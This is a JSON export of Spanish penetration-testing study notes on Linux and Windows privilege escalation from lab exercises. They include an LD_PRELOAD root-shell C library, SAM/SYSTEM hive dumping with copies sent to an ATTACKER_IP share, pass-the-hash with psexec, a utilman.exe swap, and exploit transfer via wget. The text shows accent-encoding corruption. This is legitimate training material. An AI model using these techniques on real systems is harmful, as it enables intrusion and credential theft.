suerte, John the Ripper puede devolver una o varias contrase√±as en texto plano.\n\nLa otra opci√≥n ser√≠a a√±adir un nuevo usuario con privilegios root. Esto podr√≠a sernos de ayuda para circunvalar el tedioso proceso de romper las contrase√±as.\n\nNecesitamos el valor hash de la contrase√±a que queramos usar. Esto se puede hacer r√°pidamente usando la herramienta `openssl` en Kali Linux.\n\n![[Pasted image 20251127124105.png]]\n\nEntonces a√±adimos la contrase√±a con un nombre de usuario en el archivo `/etc/shadow`.\n\n![[Pasted image 20251127124133.png]]\n\n>[!IMPORTANT] F√≠jate que hemos usado `root:/bin/bash` para conseguir una shell de root.\n\nSi nos cambiamos a este usuario tendremos la shell como root.\n\n![[Pasted image 20251127124308.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Enumeration",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/2-enumeration/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/2. Enumeration.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "cat La enumeraci√≥n es el primer paso que debes tomar una vez ganas acceso a cualquier sistema. En entornos reales, el test no acaba cuando ganas acceso al sistema.\n\n-----------------------------------\n<h2>hostname</h2>\nEl comando `hostname` devolver√° el nombre de la m√°quina. Aunque este valor puede ser f√°cilmente cambiado o ser una string sin sentido, a veces puede ofrecer cierta informaci√≥n a cerca de la funci√≥n en la red (por ejemplo SQL-PROD-01 para un servidor de producci√≥n SQL).\n\n------------------------------------\n<h2>uname -a</h2>\nMostrar√° informaci√≥n del sistema d√°ndonos detalles sobre el kernel usado. Es √∫til cuando queremos buscar versiones vulnerables del kernel que nos lleven a una escalada de privilegios.\n\n-----------------------------------------\n<h2>/proc/version</h2>\nEl filesystem proc (procfs) nos ofrece informaci√≥n sobre los procesos del sistema objetivo. Mirar en `/proc/version` puede darte informaci√≥n sobre el kernel e informaci√≥n adicional como si un compilador est√° instalado.\n\n---------------------------------------\n<h2>/etc/issue</h2>\nTambi√©n se puede identificar sistemas mirando el archivo `/etc/issue`. Este normalmente contiene algo de informaci√≥n sobre el sistema operativo pero puede ser personalizado/cambiado.\n\n------------------------------------\n<h2>Comando ps</h2>\nEl comando `ps` es un m√©todo efectivo para ver procesos corriendo en un sistema Linux. El comando `ps` mostrar√° los procesos para la shell actual.\n\nEl output de `ps` (Process Status) muestra:\n\n- **PID:** El ID del proceso (√∫nico).\n- **TTY:** Tipo de terminal usada por el usuario.\n- **Time:** Cantidad de tiempo de CPU usado por el proceso (no es el tiempo que lleva corriendo).\n- **CMD:** Comando o archivo ejecutable corriendo.\n\nEl comando `ps` ofrece unas cuantas opciones de ayuda.\n\n- `ps -A`: Muestra todos los procesos.\n- `ps axjf`: Muestra el √°rbol de procesos.\n- `ps aux`: La opci√≥n `aux` mostrar√° los procesos de todos los usuarios (a), el usuario que lanz√≥ el proceso (u) y procesos que no est√°n atados a la terminal (x).\n\n-------------------------------------------------\n<h2>env</h2>\nEl comando `env` mostrar√° variables de entorno (environment).\n\nLa variable PATH podr√≠a tener un compilador o lenguaje de scripting (python) que podr√≠a ser usado para ejecutar c√≥digo en el sistema objetivo o para escalar privilegios.\n\n---------------------------------------------\n<h2>sudo -l</h2>\nEl sistema objetivo puede que haya sido configurado para permitir a los usuarios ejecutar algunos (o todos los) comandos como \"root\". El comando `sudo -l` lista los comandos que puedes ejecutar usando `sudo`.\n\n--------------------------------\n<h2>ls</h2>\nUno de los comandos m√°s comunes usados en Linux es probablemente `ls`.\n\nAl mirar potenciales vectores de escalada de privilegios, recuerda usar el comando `ls` con el par√°metro `-la`. Este ejemplo de abajo muestra gr√°ficamente por qu√© hacerlo.\n\n![[Pasted image 20251126142829.png]]\n\n--------------------------------------\n<h2>id</h2>\nEl comando `id` ofrecer√° una vista general de de los niveles del privilegio del usuario y grupos a los que pertenece.\n\nEl comando `id` puede ser usado para obtener los resultados de otro usuario.\n\n![[Pasted image 20251126143123.png]]\n\n-----------------------------------------------\n<h2>/etc/passwd</h2>\nPuede ser una manera sencilla de descubrir m√°s usuarios en el sistema.\n\n![[Pasted image 20251126143157.png]]\n\nSe puede convertir f√°cilmente en una lista de usuarios para atacar por fuerza bruta:\n\n`cat /etc/passwd | cut -d \":\" -f 1 > users.txt`\n\n-----------------------------------\n<h2>history</h2>\nMirar comandos anteriores con el comando `history` puede darnos alguna idea sobre el sistema objetivo e incluso (aunque rara vez) tener informaci√≥n almacenada como usuarios o contrase√±as.\n\n-----------------------------------------\n<h2>ifconfig</h2>\nEl sistema objetivo puede ser un punto de pivotaje hacia otra red. El comando `ipconfig` nos dar√° informaci√≥n sobre las interfaces de red en el sistema. El ejemplo de abajo muestra que el sistema objetivo tiene 3 interfaces (eth0, tun0 y tun1). Nuestra m√°quina atacante s√≥lo puede alcanzar eth0 pero no las otras dos directamente (hasta ahora que hemos tomado control del sistema objetivo).\n\n![[Pasted image 20251126184752.png]]\n\nEsto puede confirmarse mediante el comando `iproute` que nos permite ver las rutas de red existentes.\n\n![[Pasted image 20251126184827.png]]\n\n-----------------------------------\n<h2>netstat</h2>\nSiguiendo un check inicial para interfaces y rutas de red existentes, merece la pena mirar en las comunicaciones existentes. El comando `netstat` puede usarse con diferentes opciones para recoger informaci√≥n en conexiones existentes.\n\n- `netstat -a`: Muestra todos los puertos en escucha y conexiones establecidas.\n- `netstat -at` o `netstat -au`: Pueden usarse para listar protocolos TCP o UDP.\n- `netstat -l`: Lista puertos en modo de escucha. Puede mezclarse con la opci√≥n `-t` para listar s√≥lo aquellos que usen el protocolo TCP.\n  ![[Pasted image 20251126185408.png]]\n- `netstat -s`: Lista estad√≠sticas de uso por protocolo. Tambi√©n se puede combinar con las opciones `-t` o `-u` para limitar el output a un protocolo en especc√≠fico.\n- `netstat -tp`: Lista las conexiones con el nombre de servicio e informaci√≥n PID. Se puede combinar con `-l` para listar puertos que escuchan. Si vemos que el PID/nombre de programa est√° vac√≠o (`-`), puede ser que necesitemos permisos de administrador para verlo.\n- `netstat -i`: Muestra estad√≠sticas de interfaz. En este caso eth0 y tun0 son m√°s activas que tun1.\n  ![[Pasted image 20251126185938.png]]\n- `netstat -ano`: Es la opci√≥n m√°s com√∫n. Muestra todos los sockets (a), no resuelve nombres (n), muestra timers (o).\n  ![[Pasted image 20251126190122.png]]\n\n--------------------------------------\n<h2>Comando find</h2>\nBuscar en el sistema cierta informaci√≥n o vectores de escalada puede ser complicada de forma manual. Es por esto que existen herramientas como `find`.\n\n- `find . -name flag1.txt`: Busca en el directorio actual un archivo llamado \"flag1.txt\".\n- `find /home -name flag1.txt`: Busca en el directorio `/home` el archivo \"flag1.txt\".\n- `find / -type d -name config`: Busca desde la ra√≠z (`/`) un directorio llamado config.\n- `find / -type f -perm 0777`: Busca archivos con los permisos 777.\n- `find / -perm a=x`: Busca archivos ejecutables.\n- `find /home -user frank`: Busca todos los archivos para el usuario \"frank\" desde `/home`.\n- `find / -mtime 10`: Busca los archivos que fueron modificados en los √∫ltimos 10 d√≠as.\n- `find / -atime 10`: Busca los archivos que fueron accedidos en los √∫ltimos 10 d√≠as.\n- `find / -cmin -60`: Busca archivos cambiados en la √∫ltima hora.\n- `find / -amin -60`: Busca archivos accedidos en la √∫ltima hora.\n- `find / -size 50M`: Busca archivos con un tama√±o de 50 MB.  Se puede combinar con `-` o `+` para indicar que sean menores o mayores que dicho tam√±o.\n\nEl comando `find` puede devolver cantidades ingnetes de errores como \"archivo no encontrado\" o \"permiso denegado\". Por esto es importante redirigir la salida de errores a la papelera: `2>/dev/null`.\n\n- `find / -writable -type d 2>/dev/null`: Busca directorios escribibles desde la ra√≠z.\n- `find / -perm -222 -type d 2>/dev/null`:  Busca directorios escribibles desde la ra√≠z.\n- `find / -perm -o w -type d 2>/dev/null`: Busca directorios escribibles desde la ra√≠z.\n\n![[Pasted image 20251126193900.png]]\n\nSe usa o para otros, u para el due√±o y g para grupos.\n\nPara encontrar herramientas o lenguajes soportados:\n\n- `find / -name perl*`\n- `find / -name python*`\n- `find / -name gcc*`\n\nPara encontrar archivos con permisos espec√≠ficos, como aquellos con bit SUID: `find / -perm -u=s -type f 2>/dev/null`",
    "modified": "2025-12-21T00:57:17"
  },
  {
    "title": "4. Privilege Escalation - Kernel Exploits",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/4-privilege-escalation-kernel-exploits/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/4. Privilege Escalation - Kernel Exploits.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "La escalada de privilegios lleva, idealmente, a privilegios root. Esto puede conseguirse explotando una vulnerabilidad existente o accediendo a otra cuenta que tenga m√°s privilegios.\n\nA no ser que una sola vulnerabilidad nos lleve a una shell de root, el proceso de escalada de privilegios se basar√° en configuraciones err√≥neas y permisos laxos.\n\nEl kernel maneja la comunicaci√≥n entre componentes como la memoria y aplicaciones en los sistemas Linux. Esta funcionalidad cr√≠tica requiere que el kernel tenga permisos espec√≠ficos, por lo que una explotaci√≥n exitosa potencialmente llevar√° a privilegios root.\n\nLa metodolog√≠a de explotaci√≥n de kernel es sencilla:\n\n1. Identifica la versi√≥n del kernel.\n2. Busca y encuentra un c√≥digo de exploit para la versi√≥n del kernel del objetivo.\n3. Ejecuta el exploit.\n\n>[!CAUTION] Un exploit de kernel fallido puede llevar a un crasheo del sistema. Aseg√∫rate de poder permitirte este riesgo antes de explotar el kernel.\n\n----------------------------\n<h2>Fuentes de Investigaci√≥n</h2>\n1. Bas√°ndote en lo que has encontrado, puedes usar Google para buscar exploits existentes.\n2. Fuentes como [esta](https://www.cvedetails.com/) tambi√©n pueden ser √∫tiles.\n3. Otra alternativa ser√≠a usar un script como LES (Linux Exploit Suggester) pero recuerda que pueden generar falsos positivos o falsos negativos.\n\n------------------------------------\n<h2>Pistas/Notas</h2>\n1. Se muy espec√≠fico al buscar sobre la versi√≥n del kernel en Google, Exploit-DB o searchsploit.\n2. Aseg√∫rate de entender c√≥mo funciona el exploit ANTES de ejecutarlo. En un entorno CTF da igual pero puede convertirse en un problema serio en un entorno real.\n3. Algunos exploits requerir√°n interacci√≥n futura una vez ejecutados. Lee todos los comentarios e instrucciones.\n4. Puedes transferir el c√≥digo de tu m√°quina al objetivo usando el m√≥dulo `SimpleHTTPServer` de python y `wget`: `python3 -m http.server <puerto>` y luego `wget http://ip:puerto/ruta`\n\n----------------------------------------\n1. Entramos a la m√°quina con las credenciales ofrecidas.\n   ![[Pasted image 20251126212554.png]]\n2. Vemos si tiene python.\n   ![[Pasted image 20251126212622.png]]\n3. Spawneamos la shell. \n   ![[Pasted image 20251126212719.png]]\n4. Recolectamos informaci√≥n sobre el kernel.\n   ![[Pasted image 20251126213505.png]]\n5. Buscamos exploits para dicha versi√≥n.\n   ![[Pasted image 20251126213558.png]]\n6. Copiamos el exploit en nuestro sistema y servimos el archivo.\n   ![[Pasted image 20251126213805.png]]\n7. Lo descargamos en la m√°quina objetivo.\n   ![[Pasted image 20251126213923.png]]\n   No nos deja escribir en el directorio actual y no tenemos directorio home, as√≠ que nos vamos a `/tmp` y lo descargamos ah√≠.\n   ![[Pasted image 20251126214047.png]]\n8. Lo ejecutamos.\n   ![[Pasted image 20251126214128.png]]\n9. No ha funcionado as√≠ que vamos a buscar otro exploit.\n   ![[Pasted image 20251126214529.png]]\n10. Encontramos otro.\n    ![[Pasted image 20251126214548.png]]\n11. Repetimos el proceso de antes hasta llegar al punto de la ejecuci√≥n y lo compilamos.\n    ![[Pasted image 20251126214902.png]]\n12. Obtenemos la consola root.\n    ![[Pasted image 20251126214932.png]]\n13. Vamos a buscar la flag.\n    ![[Pasted image 20251126215023.png]]\n14. Leemos la flag.\n    ![[Pasted image 20251126215100.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Automated Enumeration Tools",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/3-automated-enumeration-tools/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/3. Automated Enumeration Tools.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "Hay m√∫ltiples herramientas que nos pueden ahorrar tiempo durante el proceso de enumeraci√≥n. Estas herramientas s√≥lo deber√≠an usarse sabiendo que podr√≠an pasar por alto algunos vectores de escalada. Aqu√≠ te dejamos una lista de herramientas de enumeraci√≥n autom√°tica bastante √∫tiles.\n\nLa herramienta a usar depender√° del sistema objetivo ya que no podr√°s ejecutar una herramienta escrita en python, por ejemplo, en un entorno que no tenga python instalado.\n\n- **LinPeas:** https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS\n- **LinEnum:** https://github.com/rebootuser/LinEnum\n- **LES (Linux Exploit Suggester):** https://github.com/mzet-/linux-exploit-suggester\n- **Linux Smart Enumeration:** https://github.com/diego-treitos/linux-smart-enumeration\n- **Linux Priv Checker:** https://github.com/linted/linuxprivchecker",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Privilege Escalation - Cron Jobs",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/8-privilege-escalation-cron-jobs/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/8. Privilege Escalation - Cron Jobs.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "La tareas Cron se usan para ejecutar scripts o binarios en momentos espec√≠ficos. Por defecto, corren con los privilegios de sus due√±os y no del usuario actual. Mientras que las tareas cron bien configuradas no son vulnerables, pueden ofrecer un vector de escalada de privilegios bajo ciertas condiciones. La idea es simple, si hay una tarea programada que corre con permisos de administrador y podemos cambiar el script que se ejecuta, entonces nuestro script correr√° con permisos de administrador.\n\nLas configuraciones de las tareas cron se guardan como \"crontabs\" (cron tables) para ver cu√°ndo ser√° la pr√≥xima vez que correr√° una tarea.\n\nCada usuario del sistema tiene su archivo crontab y puede correr tareas espec√≠ficas est√©n logueados o no. Como puedes esperar, nuestra meta es encontrar una tarea cron configurada por root que lea nuestro script.\n\nCualquier usuario puede leer el archivo haciendo `cat /etc/crontab`.\n\nAunque algunos entornos CTF tengan tareas cron cada minuto o cada 5 minutos, m√°s normalmente ver√°s tareas ejecut√°ndose cada d√≠a, semana o mes.\n\n![[Pasted image 20251127152548.png]]\n\nPuedes ver el script `backup.sh` configurado para ejecutarse cada minuto. El contenido del archivo muestra un script simple que crea un backup del archivo `prices.xls`.\n\n![[Pasted image 20251127152727.png]]\n\nComo nuestro usuario puede acceder a este script, podemos modificarlo para crear una reverse shell.\n\nEl script usar√° herramientas disponibles en el sistema para establecerla por lo que es importante saber qu√© opciones hay disponibles. En nuestro caso, el archivo se ver√° as√≠:\n\n![[Pasted image 20251127152910.png]]\n\nDespu√©s ejecutamos un listener en nuestra m√°quina:\n\n![[Pasted image 20251127152932.png]]\n\nSiempre merece la pena comprobar crontab ya que a veces puede llevar a vectores de escalada de privilegios f√°cilmente. Este escenario no es raro en empresas:\n\n1. Los sysadmins necesitan ejecutar un script regularmente.\n2. Crean un trabajo cron para hacerlo.\n3. Despu√©s de un tiempo, el script se vuelve in√∫til y lo borran.\n4. No limpian la tarea cron.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Privilege Escalation - Sudo",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/5-privilege-escalation-sudo/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/5. Privilege Escalation - Sudo.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "El comando `sudo` te permite ejecutar un programa con permisos de administrador. Bajo ciertas circunstancias, los sysadmins pueden necesitar flexibilizar los permisos de ciertos usuarios como por ejemplo si un analista SOC junior necesita usar Nmap pero no debe tener permisos root completos. El administrador del sistema puede permitir a este usuario ejecutar s√≥lo Nmap con `sudo`.\n\nCualquier usuario puede comprobar su relaci√≥n con `sudo` mediante el comando `sudo -l`.\n\n[GTFOBins](https://gtfobins.github.io/) es un recurso valioso que ofrece informaci√≥n de c√≥mo un programa con permisos sudo puede usarse para escalar privilegios.\n\n------------------------------------\n<h2>Usar las Funciones de una Aplicaci√≥n</h2>\nAlgunas aplicaciones no tendr√°n un exploit conocido en este contexto. Una de estas es Apache2.\n\nEn este caso podemos usar un \"hack\" para filtrar informaci√≥n gracias a usar una funci√≥n de la aplicaci√≥n. Como puedes ver abajo, Apache2 tiene una opci√≥n que permite cargar archivos de configuraci√≥n adicionales con `-f`.\n\n![[Pasted image 20251127103322.png]]\n\nCargar el archivo `/etc/shadow` usando esta opci√≥n, resultar√° en un error que incluye las primeras l√≠neas del archivo `/etc/shadow`.\n\n---------------------------------------\n<h2>Usar LD_PRELOAD</h2>\nEn algunos sistemas, puedes ver la opci√≥n de entorno LD_PRELOAD.\n\n![[Pasted image 20251127104748.png]]\n\nLD_PRELOAD es una funci√≥n que permite a cualquier programa usar librer√≠as compartidas. Si la opci√≥n \"env_keep\" est√° habilitada, podemos generar una librer√≠a compartida que ser√° cargada y ejecutada antes de que el programa se ejecute.\n\n>[!CAUTION] La opci√≥n LD_PRELOAD ser√° ignorada si el ID del usuario real es diferente del ID del usuario efectivo.\n\nLos pasos de escalada de privilegios de este vector son:\n\n1. Comprobar si hay LD_PRELOAD (con la opci√≥n env_keep).\n2. Escribir un c√≥digo C simple compilado como share object (`.so`).\n3. Ejecutar el programa con permisos sudo y la opci√≥n LD_PRELOAD apuntando a nuestro archivo `.so`.\n\nEl c√≥digo C cargar√° una consola root que puede escribirse de la siguiente manera:\n\n```c\n#include <stdio.h>  \n#include <sys/types.h>  \n#include <stdlib.h>  \n  \nvoid _init() {  \nunsetenv(\"LD_PRELOAD\");  \nsetgid(0);  \nsetuid(0);  \nsystem(\"/bin/bash\");  \n}\n```\n\nPuedes guardar este c√≥digo como `shell.c` y compilarlo usando `gcc` en un shared object usando los siguientes par√°metros:\n\n`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`\n\n![[Pasted image 20251127113835.png]]\n\nPodemos ahora usar este shared object al lanzar cualquier programa que nuestro usuario pueda ejecutar con sudo. En nuestro caso, Apache2, find, o casi cualquier programa que podamos ejecutar con sudo.\n\nNecesitamos ejecutar el programa especificando la opci√≥n LD_PRELOAD de la siguiente manera:\n\n`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`\n\nEl resultado es una shell root:\n\n![[Pasted image 20251127115916.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Conclusion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/8-conclusion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/8. Conclusion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "Si est√°s interesado en aprender m√°s t√©cnicas puedes visitar los siguientes enlaces:\n\n- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\n- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)\n- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)\n- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)\n- [Decoder's Blog](https://decoder.cloud/)\n- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)\n- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Windows Privilege Escalation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/0-windows-privilege-escalation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/0. Windows Privilege Escalation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "[[1. Windows Privilege Escalation]]\n[[2. Harvesting Passwords from Usual Spots]]\n[[3. Other Quick Wins]]\n[[4. Abusing Service Misconfigurations]]\n[[5. Abusing Dangerous Privileges]]\n[[6. Abusing Vulnerable Software]]\n[[7. Tools of the Trade]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/8. Conclusion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Abusing Dangerous Privileges",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/5-abusing-dangerous-privileges/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/5. Abusing Dangerous Privileges.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "<h2>Windows Privileges</h2>\nLos privilegios son los \"derechos\" que una cuenta tiene sobre un archivo, directorio o tarea en un sistema.\n\nCada usuario tiene un conjunto asignado de privilegios que pueden comprobarse con el comando `whoami /priv`.\n\nUna lista completa de privilegios Windows est√° disponible [aqu√≠](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). Desde el punto de vista de un atacante, s√≥lo los privilegios que nos permiten escalar en el sistema son interesantes. En el repositorio [Priv2Admin](https://github.com/gtworek/Priv2Admin) tienes una lista de privilegios explotables en Windows.\n\n----------------------------------------\n<h2>SeBacckup / SeRestore</h2>\nLos privilegios SeBackup y SeRestore permiten a los usuarios leer y escribir cualquier archivo en el sistema ignorando cualquier DACL. La idea de estos privilegios es permitir a ciertos usuarios realizar backups de un sistema sin requerir permisos completos de administrador.\n\nCon este poder en mano, un atacante puede escalar sus privilegios usando varias t√©cnicas. La que veremos consiste en copiar los registros SAM Y SYSTEM para extraer el hash de la contrase√±a del administrador local.\n\nUsaremos las credenciales dadas para acceder a la m√°quina.\n\nAhora, debemos ejecutar un cmd como administrador, desde la cuenta dada.\n\n![[Pasted image 20251130141911.png]]\n\nUna vez se abra, podemos comprobar nuestros privilegios con el siguiente comando:\n\n```cmd\nC:\\> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeBackupPrivilege             Back up files and directories  Disabled\nSeRestorePrivilege            Restore files and directories  Disabled\nSeShutdownPrivilege           Shut down the system           Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n```\n\nPara hacer un backup de los hashes de SAM y SYSTEM, podemos usar los siguientes comandos:\n\n```cmd\nC:\\> reg save hklm\\system C:\\Users\\THMBackup\\system.hive\nThe operation completed successfully.\n\nC:\\> reg save hklm\\sam C:\\Users\\THMBackup\\sam.hive\nThe operation completed successfully.\n```\n\nEsto crear√° un par de archivos con los contenidos del registro. Ahora podemos copiar estos archivos a nuestra m√°quina atacante usando SMB o cualquier otro m√©todo disponible. Para SMB, podemos usar `smbserver.py` para arrancar un servidor SMB con una compartici√≥n de red en el directorio actual.\n\n```bash\nuser@attackerpc$ mkdir share\nuser@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share\n```\n\nEsto crear√° una compartici√≥n llamada `public` que apunte al directorio `share` que requiere usuario y contrase√±a. Despu√©s, podemos usar el comando `copy` en la m√°quina Windows para transferir ambos archivos a la m√°quina atacante.\n\n```cmd\nC:\\> copy C:\\Users\\THMBackup\\sam.hive \\\\ATTACKER_IP\\public\\\nC:\\> copy C:\\Users\\THMBackup\\system.hive \\\\ATTACKER_IP\\public\\\n```\n\nY usamos el \"impacket\" para recuperar los hashes:\n\n```bash\nuser@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL\nImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation\n\n[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n```\n\nAhora podemos usar el hash del Administrator para realizar un ataque Pass-the-Hash y ganar acceso al sistema con privilegios SYSTEM:\n\n```bash\nuser@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.82.139.97\nImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation\n\n[*] Requesting shares on 10.10.175.90.....\n[*] Found writable share ADMIN$\n[*] Uploading file nfhtabqO.exe\n[*] Opening SVCManager on 10.10.175.90.....\n[*] Creating service RoLE on 10.10.175.90.....\n[*] Starting service RoLE.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n```\n\n-------------------------------------\n<h2>SeTakeOwnership</h2>\nEl privilegio SeTakeOwnership permite a un usuario tomar posesi√≥n de cualquier objeto del sistema incluyendo archivos y claves de registro, abriendo muchas posibilidades para que un atacante eleve sus privilegios ya que podr√≠amos, por ejemplo, buscar un servicio que corra como SYSTEM y tomar posesi√≥n de su ejecutable.\n\nUsaremos las credenciales dadas para iniciar sesi√≥n en la m√°quina.\n\nEjecutamos la cmd como administrador e introducimos las credenciales dadas.\n\nUna vez dentro, podemos comprobar nuestros privilegios con `whoami /priv`:\n\n```cmd\nC:\\> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                              State\n============================= ======================================== ========\nSeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                 Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set           Disabled\n```\n\nAbusaremos `utilman.exe` para escalar privilegios esta vez. Esta es una aplicaci√≥n integrada en Windows para ofrecer facilidad de acceso en la pantalla de bloqueo.\n\n![[Pasted image 20251130153711.png]]\n\nYa que Utilman corre con privilegios SYSTEM, ganaremos esos privilegios si reemplazamos el binario original por un payload nuestro. Como podemos tomar posesi√≥n de cualquier archivo, reemplazarlo es trivial.\n\nEmpezamos tomando posesi√≥n del binario.\n\n```cmd\nC:\\> takeown /f C:\\Windows\\System32\\Utilman.exe\n\nSUCCESS: The file (or folder): \"C:\\Windows\\System32\\Utilman.exe\" now owned by user \"WINPRIVESC2\\thmtakeownership\".\n```\n\n>[!NOTE] Ser el propietario de un archivo no implica que tengas privilegios sobre √©l. Pero si√©ndolo, puedes darte cualquier privilegio que quieras.\n\n```cmd\nC:\\> icacls C:\\Windows\\System32\\Utilman.exe /grant THMTakeOwnership:F\nprocessed file: Utilman.exe\nSuccessfully processed 1 files; Failed processing 0 files\n```\n\nDespu√©s de esto, cambiamos `utilman.exe` por una copia de `cmd.exe`.\n\n```cmd\nC:\\Windows\\System32\\> copy cmd.exe utilman.exe\n        1 file(s) copied.\n```\n\nPara disparar utilman, bloquearemos nuestra pantalla desde el bot√≥n de windows \"**Lock**\".\n\n![[Pasted image 20251130155554.png]]\n\nY por √∫ltimo le damos a \"Ease of Access\", que ejecutar√° `utilman.exe` con privilegios SYSTEM.\n\n![[Pasted image 20251130155641.png]]\n\n------------------------------\n<h2>SeImpersonate / SeAssignPrimaryToken</h2>\nEstos privilegios le permiten a in proceso hacerse pasar por otros usuarios y actuar en su nombre. Esto es f√°cil de entender cuando pensamos en c√≥mo funciona un servidor FTP. Este debe restringir a los usuarios para que s√≥lo puedan acceder a sus contenidos.\n\nAsumamos que tenemos un servidor FTP corriendo con el usuario `ftp`. Sin impersonation, si el usuario Ann inicia sesi√≥n e intenta acceder a los archivos, el servicio FTP tratar√≠a de acceder a ellos con su token de acceso en lugar del de Ann.\n\n![[Pasted image 20251130164033.png]]\n\nHay varias razones por las que usar el token de ftp no es buena idea:\n\n- Para que los archivos se sirvan correctamente, necesitar√≠an ser accesibles al usuario `ftp`. En el 